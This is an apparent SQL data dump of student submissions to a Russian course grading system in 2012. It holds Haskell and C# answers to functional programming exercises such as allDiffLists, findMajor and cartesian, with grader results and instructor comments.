(3798, 107, '472848', '2012-11-20 12:48:53', 1, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr\r\n\r\neval T _ = 1\r\neval F _ = 0\r\neval X v = eval v v\r\neval (And ex1 ex2) v = (eval ex1 v) * (eval ex2 v)\r\neval (Or ex1 ex2) v = (eval ex1 v) + (eval ex2 v)\r\neval (Not ex) v | eval ex v == 0 = 1\r\n                | otherwise      = 0\r\n\r\ninstance Eq LogExpr where\r\n  ex1 == ex2 = (eval ex1 T == eval ex2 T) && (eval ex1 F == eval ex2 F)', '<br/>Тесты успешно пройдены!'),
(3799, 109, '12206137', '2012-11-20 12:53:17', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        static void AllDiff (Func<int,bool> cond, Action print, int n, int k) {\r\n\r\n            if (k == 0) {\r\n\r\n                print();\r\n\r\n                Console.WriteLine();\r\n\r\n                return;\r\n\r\n            }\r\n\r\n            for(int i = 1; i <= n; i++) {\r\n\r\n                if (!cond(i)) continue;\r\n\r\n                AllDiff (x => cond(x) && i != x, () => {print(); Console.Write(i + " ");}, n, k-1);\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void AllDiffLists (int n, int k) {\r\n\r\n            AllDiff (x => true, () => {} ,n, k);\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            AllDiffLists(3,2);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3800, 103, '472848', '2012-11-20 13:09:22', 1, 'find [] pred def = def\r\nfind (x:xs) pred def = if (pred x) then x else find xs pred def\r\n\r\nfindInLists li pred def = find (find li (l -> def /= find l pred def) []) pred def\r\n   --- OK, но можно написать проще (или по крайтей мере короче:) - мы это обсудим', '<br/>Тесты успешно пройдены!'),
(3801, 103, '1384577', '2012-11-20 14:02:52', 2, 'import Data.List\r\nfindInLists xs p n = maybe n id (head (xs >>= x-> return (find p x))) \r\n   --- Нет, эта задача не про >>=. Если вы хотите ее сделать (что, в общем то не обязательно),\r\n   --- то надо посмотреть, что за find мы пискали на занятии, и как-то его применить.', 'Выражение имеет неправильное значение: findInLists [[1,2], [2,8,7]] (>5) 0'),
(3802, 103, '318210', '2012-11-20 15:42:32', 1, 'find1 cond [] t = t\r\nfind1 cond (x:xs) t = if cond x then x else find1 cond xs t\r\n\r\n\r\nfindInLists xs cond t =  find1 ( /= t) (xs >>= (x -> return ( find1 cond x t ) >>= (\r\n -> return r))) t\r\n\r\n--надеюсь, ожидалось это. Или find определялась иначе\r\n-- (я просто знал про find из Data.List, но там нету же failure continuation, он возвращает Maybe a)\r\n   --- Засчитано, но findInLists можно написать гораздо, гораздо проще, без всяких >>= и в одну строчку. \r\n   --- (А find1 описано правильно.) \r\n			', '<br/>Тесты успешно пройдены!'),
(3803, 86, '318210', '2012-11-20 16:21:59', 2, '  --- Забыли вставить текст?', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3804, 100, 'tonyo', '2012-11-20 16:30:07', 1, 'allDiffLists n k = allDiffLists1 n k (	 -> False)                                                                                                                                              \r\n\r\nallDiffLists1 n 0 _ = [[]]\r\nallDiffLists1 n k f = [i:xs | i <- [1..n], not (f i), xs <- allDiffLists1 n (k-1) (x -> f x || x == i)]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3805, 105, '472848', '2012-11-20 16:37:51', 1, 'cartesian xs ys = xs >>= ( x -> ys >>= (y -> return (x,y)))', '<br/>Тесты успешно пройдены!'),
(3806, 100, '318210', '2012-11-20 16:42:32', 1, 'allNondivisible xs = ch xs (\\_->True) \r\n	where \r\n		ch [] func = True \r\n	        ch (x:xs) func \r\n			 | not (func x) = False  \r\n			 | otherwise = ch xs (	 -> (func t) && ((max t x) `mod` (min t x) /= 0))\r\n\r\nallDiffLists n k = f n k (\\_ -> True)\r\n	where \r\n		f n 0 cond = [[]]\r\n		f n l cond = [i:xs | i <- [1..n], cond i, xs <- f n (l-1) (	 -> (cond t) && (t /= i) )]', '<br/>Тесты успешно пройдены!'),
(3807, 101, 'tonyo', '2012-11-20 16:50:42', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n  deriving (Eq, Show)\r\n\r\n\r\nsimplify (Add e1 e2) = (Add (simplify e1) (simplify e2))\r\nsimplify X = X        \r\nsimplify (N i) = N i \r\n\r\nsimplify (Mult e (N 0)) = N 0 \r\nsimplify (Mult (N 0) e) = N 0 \r\nsimplify (Mult e1 e2) = if arg == res \r\n                        then arg \r\n                        else simplify res \r\n  where arg = Mult e1 e2; res = (Mult (simplify e1) (simplify e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3808, 100, '6774563', '2012-11-20 17:04:19', 1, 'allDiffLists n k = allDiffLists'' n k (const False) [] []\r\n\r\nallDiffLists'' _ 0 _ acc cur = cur:acc\r\nallDiffLists'' n k used acc cur = foldr (processElement) acc (filter (not.used) [1..n]) where\r\n	processElement e acc = allDiffLists'' n (k-1) (x -> used x || x == e) acc (e:cur)\r\n', '<br/>Тесты успешно пройдены!'),
(3809, 101, '6774563', '2012-11-20 17:04:51', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N i) = N i\r\nsimplify (Add e1 e2)    = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 e2)   = if (isZero es1 || isZero es2) then (N 0) else (Mult es1 es2) where\r\n	es1 = simplify e1\r\n	es2 = simplify e2\r\n	isZero (N 0) = True\r\n	isZero _ = False\r\n', '<br/>Тесты успешно пройдены!'),
(3810, 102, '6774563', '2012-11-20 17:05:27', 0, 'findMajor xs = let s = sum xs in find (> s `div` 2) xs\r\n', 'Не удалось вычислить выражение "findMajor [2,3,15,2,2,2]", проверьте правильность синтаксиса'),
(3811, 102, '6774563', '2012-11-20 17:06:39', 1, 'import Data.List\r\n\r\nfindMajor xs = let s = sum xs in find (> s `div` 2) xs\r\n', '<br/>Тесты успешно пройдены!'),
(3812, 103, '6774563', '2012-11-20 17:07:04', 1, 'findInLists xs f fp = let \r\n	isTargetList ys = find ys f fp /= fp in\r\n		find (find xs (isTargetList) []) f fp\r\n    --- ОК, можно так, но я, кстати, имел в виду другое решение, покороче.\r\n\r\nfind [] _ fc = fc\r\nfind (x:xs) f fc =\r\n	if f x then x\r\n	else find xs f fc\r\n', '<br/>Тесты успешно пройдены!'),
(3813, 104, '6774563', '2012-11-20 17:07:39', 1, 'doubleEven xs = xs >>= a -> if a `mod` 2 == 0 then [a,a] else [a]\r\n', '<br/>Тесты успешно пройдены!'),
(3814, 105, '6774563', '2012-11-20 17:08:01', 1, 'cartesian xs ys = xs >>= x -> map (y -> (x,y)) ys\r\n   --- ОК, но если бы вы еще вместо map написали >>= (а это совсем просто), то было бы совсем по условию. \r\n', '<br/>Тесты успешно пройдены!'),
(3815, 107, '6774563', '2012-11-20 17:52:45', 1, 'data LogExpr = T | F | X | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr\r\n\r\ninstance Eq LogExpr where\r\n	e1 == e2 = eval e1 True == eval e2 True && eval e1 False == eval e2 False\r\n\r\neval T _ = True\r\neval F _ = False\r\neval X value = value\r\neval (And e1 e2) value = eval e1 value && eval e2 value\r\neval (Or e1 e2) value = eval e1 value || eval e2 value\r\neval (Not e) value = not (eval e value)\r\n', '<br/>Тесты успешно пройдены!'),
(3816, 106, '17107004', '2012-11-20 17:58:35', 0, 'step (a, b) x \n\n        | a == x    = (a, b + 1)\n\n        | b == 1    = (x, 1)\n\n        | otherwise = (a, b - 1)\n\n\n\ntest v [] a b = if (b * 2 > a) then True else False\n\ntest v (x : xs) a b = test v xs (a + 1) (b + (if v == x then 1 else 0))\n\n\n\nfindMajor lst = let (a, b) = foldl step (head lst, 1) (tail lst) in\n\n                if (test a lst 0 0) then Just a else Nothing\n\n\n', '<br/>Тесты успешно пройдены!'),
(3817, 106, '17107004', '2012-11-20 17:59:53', 1, 'step (a, b) x \r\n\r\n        | a == x    = (a, b + 1)\r\n\r\n        | b == 1    = (x, 1)\r\n\r\n        | otherwise = (a, b - 1)\r\n\r\n\r\n\r\ntest v [] a b = b * 2 > a -- simplyfied expression\r\n\r\ntest v (x : xs) a b = test v xs (a + 1) (b + (if v == x then 1 else 0))\r\n\r\n\r\n\r\nfindMajor lst = let (a, b) = foldl step (head lst, 1) (tail lst) in\r\n\r\n                if (test a lst 0 0) then Just a else Nothing\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3818, 101, 'hasp', '2012-11-20 19:27:07', 1, 'data Expr = X | N Int | Add Expr Expr | Mult Expr Expr deriving Show \r\n\r\nisZero (N 0) = True\r\nisZero _ = False\r\n\r\nsimplify X = X \r\nsimplify n@(N _) = n\r\nsimplify (Add l r) = Add (simplify l) (simplify r)\r\nsimplify (Mult l r) = let sl = simplify l; sr = simplify r in if (isZero sl)||(isZero sr) then N 0 else Mult sl sr', '<br/>Тесты успешно пройдены!'),
(3819, 100, 'hasp', '2012-11-20 19:27:42', 1, 'emptySet = 	 -> False\r\nsinglt s = 	 -> if t == s then True else False\r\nadd s set = 	 -> if t == s then True else set t\r\n\r\nallDiffListsI _ 0 _ = [[]]\r\nallDiffListsI n k set = [i:xs | i <- [1..n], not (set i), xs <- allDiffListsI n (k-1) (add i set)]\r\n\r\nallDiffLists n k = allDiffListsI n k emptySet', '<br/>Тесты успешно пройдены!'),
(3820, 106, 'hasp', '2012-11-20 19:28:06', 1, 'findMajor [] = Nothing\r\nfindMajor l@(x:xs) = let c = fst (foldl ((cdt, cntr) e -> if e == cdt then (cdt,cntr + 1) else if cntr > 0 then (cdt, cntr - 1) else (e,1)) (x,1) l) in\r\n						let (cc, ln) = foldl ((cntr,l) e -> if e == c then (cntr + 1,l + 1) else (cntr, l + 1)) (0,0) l in \r\n							if cc > ln `div` 2 then Just c else Nothing\r\n', '<br/>Тесты успешно пройдены!'),
(3821, 100, '44060', '2012-11-20 19:37:14', 0, '', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3822, 110, '12206137', '2012-11-20 19:40:23', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    delegate int IntFunc();\r\n\r\n    class Program {\r\n\r\n        static int Find(IEnumerable<int> a, Func<int,bool> cond, IntFunc fc) {\r\n\r\n            foreach(var e in a) {\r\n\r\n                if (cond(e)) return e;\r\n\r\n            }\r\n\r\n            return fc();\r\n\r\n        }\r\n\r\n        static void print(int[] a) {\r\n\r\n            Console.WriteLine(Find(a, x => x < 10, () => Find(a, x => x < 20, () => 20 )));\r\n\r\n        }\r\n\r\n        \r\n\r\n        public static void Main(string[] args) {\r\n\r\n            int[] a = {23, 5, 100};\r\n\r\n            print(a);\r\n\r\n            a[1] = 15;\r\n\r\n            print(a);\r\n\r\n            a[1] = 30;\r\n\r\n            print(a);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3823, 100, '44060', '2012-11-20 20:09:05', 0, 'Я не очень поняла из Вашего комментария, почему задача не зачтена...\r\nЧто-то необходимо исправить кроме порядка?', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3824, 100, '44060', '2012-11-20 20:16:23', 2, 'Все, поняла, что не так:)\r\nИсправлю', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3825, 100, '82873297', '2012-11-20 20:36:11', 1, 'allDiffLists n k = allDiffLists1 n k (	->True)\r\n\r\n\r\n\r\nallDiffLists1 n 0 cond = [[]]\r\n\r\nallDiffLists1 n k cond = [i:xs|i<-[1..n],cond i,xs<-allDiffLists1 n (k-1) (	->(cond t)&&(t/=i))]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3826, 106, '12206137', '2012-11-20 20:36:18', 1, 'findMajor list =\r\n\r\n    let maybe = fst $ foldl ((old, cnt) cur -> if cnt == 0 then (cur,1)\r\n\r\n                                                else if old == cur then (old, cnt+1)\r\n\r\n                                                else (old, cnt-1)\r\n\r\n                            ) (0, 0) list\r\n\r\n    in\r\n\r\n    let isGood = ((x,y) -> x > y) $ foldl ((c1,c2) x -> if x == maybe then (c1+1,c2) else (c1,c2+1)) (0,0) list in\r\n\r\n    if isGood then Just maybe\r\n\r\n    else Nothing\r\n', '<br/>Тесты успешно пройдены!'),
(3827, 101, '82873297', '2012-11-20 20:37:01', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show,Eq)\r\n\n\r\n\nsimplify X = X\r\n\nsimplify (N i) = (N i)\r\n\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\n\nsimplify (Mult e1 e2) | (e1 /= (N 0) && e2 /= (N 0)) = simplify (Mult (simplify e1) (simplify e2))\r\n\n                      | otherwise = (N 0)\n', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(3828, 102, '82873297', '2012-11-20 20:37:33', 0, 'findMajor xs = findMajor1 xs (sum xs)\r\n\n\r\n\nfindMajor1 [] n = Nothing\r\n\nfindMajor1 (x:xs) n | x>n/2 = Just x\r\n\n                    | otherwise = findMajor1 xs n\r\n\n\n', 'Выражение имеет неправильное значение: findMajor [2,3,15,2,2,2]'),
(3829, 102, '82873297', '2012-11-20 20:39:31', 1, 'findMajor xs = findMajor1 xs (sum xs)\r\n\r\n\r\n\r\nfindMajor1 [] n = Nothing\r\n\r\nfindMajor1 (x:xs) n | x>(div n 2) = Just x\r\n\r\n                    | otherwise = findMajor1 xs n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3830, 103, '82873297', '2012-11-20 20:40:14', 1, 'findInLists [] cond err = err\r\n\r\nfindInLists (xs:xss) cond err | (findres == err) = findInLists xss cond err\r\n\r\n                              | otherwise = findres \r\n\r\n                                            where findres = find cond xs err\r\n\r\n\r\n\r\nfind cond [] err = err\r\n\r\nfind cond (x:xs) err = if cond x then x\r\n\r\n                       else find cond xs err\r\n', '<br/>Тесты успешно пройдены!'),
(3831, 104, '82873297', '2012-11-20 20:40:32', 1, 'doubleEven xs = xs >>= x->if (mod x 2)==0 then [x,x] else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3832, 105, '82873297', '2012-11-20 20:40:51', 0, 'cartesian xs [] = []\r\n\ncartesian xs (y:ys) = (xs >>= x->[[x,y]])++(cartesian xs ys)\n', 'Выражение имеет неправильное значение: cartesian [1,2] [3,4]'),
(3833, 105, '82873297', '2012-11-20 20:42:24', 0, 'cartesian xs [] = []\r\n\ncartesian xs (y:ys) = (xs >>= x->[(x,y)])++(cartesian xs ys)\n', 'Выражение имеет неправильное значение: cartesian [1,2] [3,4]'),
(3834, 105, '82873297', '2012-11-20 20:43:59', 1, 'cartesian [] xs = []\r\n\r\ncartesian (x:xs) ys = (ys >>= y->[(x,y)])++(cartesian xs ys)\r\n  --- OK, но вместо рекурсии по xs тоже можно воспользоваться >>=\r\n', '<br/>Тесты успешно пройдены!'),
(3835, 101, '82873297', '2012-11-20 20:53:19', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show,Eq)\r\n\r\n\r\n\r\nsimplify X = X\r\n\r\nsimplify (N i) = (N i)\r\n\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\n\r\nsimplify (Mult e1 e2) | (simplify e1 /= (N 0) && simplify e2 /= (N 0)) = Mult (simplify e1) (simplify e2)\r\n\r\n                      | otherwise = (N 0)\r\n   --- OK , но только, конечно, лучше не вызывать simplify по 2 раза.. \r\n', '<br/>Тесты успешно пройдены!'),
(3836, 104, '5656962', '2012-11-20 21:48:46', 1, 'doubleEven list = list >>= x -> if x `mod` 2 == 0 then [x, x] else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3837, 105, '5656962', '2012-11-20 21:49:01', 1, 'cartesian list1 list2 = list1 >>= x -> list2 >>= y -> [(x, y)]\r\n', '<br/>Тесты успешно пройдены!'),
(3838, 104, '472848', '2012-11-20 21:53:38', 1, '-- Не придумал как проще вписывать два элемента вместо одного\r\ndoubleEven li = (foldr (.) id (li >>= (x -> return (mod x 2 == 0) >>= (\r\n -> if r then return (l -> x:x:l) else return (l -> x:l)))))\r\n   --- Ну, ясно что задачу с таким решением я бы дал только как дополнительую))\r\n   --- На самом деле >>= для списков имеет очень простой и естественный смысл\r\n   --- и решение гораздо, гораздо короче.. ', '<br/>Тесты успешно пройдены!'),
(3839, 102, '442421', '2012-11-20 22:34:18', 1, 'findMajor x = findMajor'' (sum x) x\r\n\r\nfindMajor'' n [] = Nothing\r\nfindMajor'' n (x:xs) = if n-x<x then Just x else findMajor'' n xs ', '<br/>Тесты успешно пройдены!'),
(3840, 104, '442421', '2012-11-20 23:27:50', 1, 'doubleEven x = x>>=(x->if mod x 2 == 0 then [x,x] else [x])', '<br/>Тесты успешно пройдены!'),
(3841, 105, '442421', '2012-11-20 23:37:44', 1, 'cartesian xs ys = xs>>=(x->(map (y->(x,y)) ys))\r\n  --- OK ,  но map тоже можно записать с помощью >>= и тогда получится совсем по условию.', '<br/>Тесты успешно пройдены!'),
(3842, 103, '442421', '2012-11-21 00:06:33', 2, '--к сожалению, отсутствовал на занятии и не очень понимаю задачу, на данный момент такое решение\r\n  --- Давайте я вас попрошу написать findInList используя этот ваш find но не используя\r\n  --- никакие встроенные функции (с помощью рекурсии). Можете при этом использовать if.\r\n  --- Не то чтобы это было очень принципиально, просто для единообразия требований ко всем..  \r\n\r\nfind [] b n = n\r\nfind (x:xs) b n = if b x then x else find xs b n \r\n\r\nfindInLists x b n = find (concat x) b n', '<br/>Тесты успешно пройдены!'),
(3843, 106, 'Deutsche', '2012-11-21 06:22:06', 1, 'findMajor [] = Nothing\r\nfindMajor (x:s) = fM s x 1 (x:s) 1\r\n\r\nfM [] x i s1 l = if (i == 0) \r\n			then Nothing\r\n	         else check s1 x l 0\r\nfM (y:s) x i s1 l = if ((i /= 0)&&(y == x))\r\n			then fM s x (i+1) s1 (l+1)\r\n	            else \r\n		    if ((i /= 0)&&(y /= x))\r\n			then fM s x (i-1) s1 (l+1)\r\n	            else fM s y 1 s1 (l+1)\r\n\r\ncheck [] x l count = if (count > l `div` 2)\r\n			then Just x\r\n		     else Nothing\r\n			\r\ncheck (y:s) x l count = if (count > l `div` 2)\r\n			then Just x\r\n			else\r\n			if (y == x)\r\n			then check s x l (count+1)\r\n			else check s x l count', '<br/>Тесты успешно пройдены!'),
(3844, 107, 'Deutsche', '2012-11-21 06:22:53', 1, 'data LogExpr = X|T|F|And LogExpr LogExpr|Or LogExpr LogExpr|Not LogExpr\r\ninstance Eq LogExpr where\r\n	(l) == (r) = ((subst r T == subst l T) && (subst r F == subst l F))\r\n\r\nsubst T _ = True\r\nsubst F _ = False\r\nsubst X T = True\r\nsubst X F = False\r\nsubst (Not e) z = not (subst e z)\r\nsubst (And r l) z = (subst r z) && (subst l z)\r\nsubst (Or r l) z = (subst r z) || (subst l z)', '<br/>Тесты успешно пройдены!'),
(3845, 108, 'Deutsche', '2012-11-21 06:23:33', 1, 'queens n k = if (k>n)\r\n		then []\r\n	     else queens1 n k 1 (\\_ -> True)\r\nqueens1 n 0 k cond1 = [[]]\r\nqueens1 n restk colnum cond1 = let\r\n				 mfc = (filter (	 -> (cond1 t)) (map (j -> (colnum, j)) [1..n]))\r\n			       in [x:xs | x <- mfc, xs <- queens1 n (restk-1) (colnum+1) (pair -> ((cond1 pair)) && (snd pair /= snd x) && ( not ((fst x - snd x == fst pair - snd pair) || (fst x + snd x == fst pair + snd pair))))]', '<br/>Тесты успешно пройдены!'),
(3846, 103, '3607492', '2012-11-21 09:00:40', 2, 'import Data.List\r\n\r\nfindInLists [] f ex = ex\r\nfindInLists (x:xs) f ex = case (find f x) of\r\n						  Nothing -> findInLists xs f ex\r\n						  Just z -> z\r\n   --- Нет, это не совсем по условию. Тут надо было использовать не стандартный find,\r\n   --- а find, который мы проходили на занятиях.', '<br/>Тесты успешно пройдены!'),
(3847, 102, '3607492', '2012-11-21 09:05:06', 1, 'findMajor [] = Nothing\r\nfindMajor x = case [z|z<-x , z>(foldl (+) (-z) x)] of\r\n			  []->Nothing\r\n			  (x:xs)->Just x\r\n   --- OK, но это у вас получается квадратичный алгоритм, а тут очень легко можно написать линейный ', '<br/>Тесты успешно пройдены!'),
(3848, 106, '2118411', '2012-11-21 09:54:53', 1, 'findMajor xs\r\n        | countT > length xs `div` 2 = Just tmp\r\n        | otherwise = Nothing\r\n        where\r\n                tmp = findIt t 1 1 0 h\r\n                countT = length (filter (==tmp) xs)\r\n                h = head xs\r\n                t = tail xs\r\n\r\nfindIt [] _ _ _ curVal = curVal\r\nfindIt (x:xs) i count curId curVal = findIt xs (i+1) newCount newCurId newCurVal\r\n        where\r\n                tmpCount = if (x == curVal) then (count+1) else (count-1)\r\n                newCount = if (tmpCount == 0) then 1 else tmpCount\r\n                newCurId = if (tmpCount == 0) then i else curId\r\n                newCurVal = if (tmpCount == 0) then x else curVal\r\n', '<br/>Тесты успешно пройдены!'),
(3849, 101, '3607492', '2012-11-21 10:29:20', 1, 'data Expr = Add Expr Expr | Mult Expr Expr | N Int | X deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N z) = N z\r\nsimplify (Add x y) = Add (simplify x) $simplify y\r\nsimplify (Mult (N 0) x) = N 0\r\nsimplify (Mult x (N 0)) = N 0\r\nsimplify (Mult x y) = case (x1,y1) of\r\n					 	(N 0,_)-> N 0\r\n					 	(_,N 0)-> N 0\r\n					 	_ -> Mult x1 y1\r\n					  where \r\n					  	x1 = simplify x\r\n					  	y1 = simplify y', '<br/>Тесты успешно пройдены!'),
(3850, 102, '5656962', '2012-11-21 11:16:36', 1, 'findMajor list = let allsum = (sum list) in\r\n\r\n					foldr (x res -> if 2*x > allsum then Just x else res) Nothing list\r\n\r\n	\r\n', '<br/>Тесты успешно пройдены!'),
(3851, 100, '3431532', '2012-11-21 11:41:44', 1, 'allList 0 x = [([], (	 -> True))]\r\nallList l x = [(a:xs, 	 ->  t /= a && cond t) | a<-[1..x], (xs, cond)<-allList (l-1) x, cond a == True]\r\n\r\nallDiffLists a b = map ((x,y) -> x) (allList a b)\r\n  --- Засчитано, но нет, это не совсем то, так получится неэффективно, потому что у вас все проверки\r\n  --- делаются в самом конце. Получиться все равно что сгеренировать _все_ наборы и потом отобрать нужные', '<br/>Тесты успешно пройдены!'),
(3852, 100, '472848', '2012-11-21 11:42:48', 1, 'allDiffLists n k = adl k [1..n] (x -> True)\r\n\r\nadl 0 _ _ = [[]]\r\nadl k li pred = [x:l | x <- li, pred x, l <- (adl (k-1) li (y-> pred y && y /= x))]', '<br/>Тесты успешно пройдены!'),
(3853, 107, '3607492', '2012-11-21 11:54:16', 0, 'data LogExpr = And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | T | F | X | Err deriving Show\r\n\r\nsimplify (Not a) = case (simplify a) of \r\n					F->T\r\n					T->F\r\n					(Not X)->X\r\n					z -> Not z\r\nsimplify (Or a b) = case (simplify a, simplify b) of\r\n					(F,F)->F\r\n					(T,_)->T\r\n					(_,T)->T\r\n					(X,F)->X\r\n					(F,X)->X\r\n					(X,X)->X\r\n					(Not X,Not X)->Not X\r\n					(X,Not X)->T\r\n					(Not X,X)->T\r\n					_->Err\r\nsimplify (And a b) = case (simplify a, simplify b) of\r\n					(T,T)->T\r\n					(F,_)->F\r\n					(_,F)->F\r\n					(X,T)->X\r\n					(T,X)->X\r\n					(X,X)->X\r\n					(Not X,Not X)->Not X\r\n					(X,Not X)->F\r\n					(Not X,X)->F\r\n					_->Err\r\nsimplify a = a\r\n\r\ninstance Eq LogExpr  where\r\n	a == b = case (a,b) of \r\n		     (F,F)->True\r\n		     (T,T)->True\r\n		     (T,F)->False\r\n		     (F,T)->False\r\n		     (X,X)->True\r\n		     (Not X,Not X)->True\r\n		     (X,Not X)->False\r\n		     (Not X,X)->False\r\n		     (Err,_)->False\r\n		     (_,Err)->False\r\n		     (x,y)->(simplify x == simplify y)', 'Не удалось вычислить выражение "Or X (And X (Not X)) == T", проверьте правильность синтаксиса'),
(3854, 107, '3607492', '2012-11-21 12:01:17', 1, 'data LogExpr = And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | T | F | X | Err deriving Show\r\n\r\nsimplify (Not a) = case (simplify a) of \r\n					F->T\r\n					T->F\r\n					(Not X)->X\r\n					z -> Not z\r\nsimplify (Or a b) = case (simplify a, simplify b) of\r\n					(F,F)->F\r\n					(T,_)->T\r\n					(_,T)->T\r\n					(X,F)->X\r\n					(F,X)->X\r\n					(X,X)->X\r\n					(Not X,Not X)->Not X\r\n					(X,Not X)->T\r\n					(Not X,X)->T\r\n					_->Err\r\nsimplify (And a b) = case (simplify a, simplify b) of\r\n					(T,T)->T\r\n					(F,_)->F\r\n					(_,F)->F\r\n					(X,T)->X\r\n					(T,X)->X\r\n					(X,X)->X\r\n					(Not X,Not X)->Not X\r\n					(X,Not X)->F\r\n					(Not X,X)->F\r\n					_->Err\r\nsimplify a = a\r\n\r\ninstance Eq LogExpr  where\r\n	a == b = case (a,b) of \r\n		(F,F)->True\r\n		(T,T)->True\r\n		(T,F)->False\r\n		(F,T)->False\r\n		(X,X)->True\r\n		(Not X,Not X)->True\r\n		(X,Not X)->False\r\n		(Not X,X)->False\r\n		(Err,_)->False\r\n		(_,Err)->False\r\n		(X,_)->False\r\n		(_,X)->False\r\n		(x,y)->(simplify x == simplify y)', '<br/>Тесты успешно пройдены!'),
(3855, 110, '2118411', '2012-11-21 12:42:03', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] arr = { 23, 23, 23, 23, 25, 23, 27, 24 };\r\n\r\n            var res = find(x => x < 10, arr, () => { return find(x => x < 20, arr, () => { return 20; }); });\r\n\r\n            Console.WriteLine(res);\r\n\r\n        }\r\n\r\n\r\n\r\n        static int find(Predicate<int> func, IEnumerable<int> a, Func<int> err)\r\n\r\n        {\r\n\r\n            foreach (var x in a)\r\n\r\n            {\r\n\r\n                if (func(x))\r\n\r\n                {\r\n\r\n                    return x;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return err();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3856, 109, '2118411', '2012-11-21 12:57:17', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            AllDiffLists(3, 2);\r\n\r\n        }\r\n\r\n\r\n\r\n        static void AllDiffLists(int n, int k)\r\n\r\n        {\r\n\r\n            AllDiffLists2(n, k, t => true, () => { });\r\n\r\n        }\r\n\r\n\r\n\r\n        static void AllDiffLists2(int n, int k, Predicate<int> cond, Action f)\r\n\r\n        {\r\n\r\n            if (k == 0)\r\n\r\n            {\r\n\r\n                f();\r\n\r\n                Console.WriteLine();\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                for (int i = 1; i <= n; i++)\r\n\r\n                {\r\n\r\n                    if (cond(i))\r\n\r\n                    {\r\n\r\n                        AllDiffLists2(n, k - 1, getPred(cond, i), () => { f(); Console.Write("{0} ", i); });\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static Predicate<int> getPred(Predicate<int> cond, int val)\r\n\r\n        {\r\n\r\n            return (t => cond(t) && t != val);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3857, 109, '2562137', '2012-11-21 13:38:23', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace AllDifferent\r\n\r\n{\r\n\r\n    class MainClass\r\n\r\n    {\r\n\r\n		public static void AllDiffLists(int n, int k)\r\n\r\n		{\r\n\r\n			AllDiffLists1(n, k, () => {}, x => true);\r\n\r\n		}\r\n\r\n\r\n\r\n		public static void AllDiffLists1(int n, int k, Action print, Predicate<int> cond)\r\n\r\n		{\r\n\r\n			if (k == 0)\r\n\r\n			{\r\n\r\n				print();\r\n\r\n				Console.WriteLine();\r\n\r\n			}\r\n\r\n			else\r\n\r\n			{\r\n\r\n				for (int x = 1; x <= n; x++)\r\n\r\n				{\r\n\r\n					if (cond(x))\r\n\r\n					{\r\n\r\n						AllDiffLists1(n, k-1, () => {print(); Console.Write(x + " ");}, t => cond(t) && t != x);\r\n\r\n					}\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n        	AllDiffLists(3, 3);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
